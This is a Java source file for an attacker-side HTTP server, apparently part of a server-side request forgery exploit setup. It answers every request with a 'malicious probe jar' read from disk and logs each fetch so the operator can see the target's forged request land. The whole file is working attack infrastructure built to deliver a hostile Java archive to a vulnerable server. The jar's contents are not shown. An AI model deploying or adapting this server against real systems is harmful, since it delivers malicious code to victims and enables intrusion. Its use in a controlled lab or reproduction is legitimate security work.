import com.sun.net.httpserver.HttpServer;
import java.io.*;
import java.net.InetSocketAddress;
import java.nio.file.*;

/** Serves the malicious probe jar (built by entrypoint.sh) for any path, and logs
 *  every fetch so you can watch the target's SSRF land. */
public class AttackerServer {
    public static void main(String[] a) throws Exception {
        int port = Integer.parseInt(System.getProperty("port", "8000"));
        byte[] jar = Files.readAllBytes(Paths.get("/www/probe"));
        HttpServer s = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);
        s.createContext("/", ex -> {
            System.out.println("[attacker] " + ex.getRequestMethod() + " " + ex.getRequestURI()
                    + " from " + ex.getRemoteAddress() + "  -> serving malicious jar (" + jar.length + "b)");
            ex.getResponseHeaders().set("Content-Type", "application/java-archive");
            ex.sendResponseHeaders(200, jar.length);
            ex.getResponseBody().write(jar);
            ex.close();
        });
        s.start();
        System.out.println("[attacker] serving malicious jar on :" + port);
    }
}
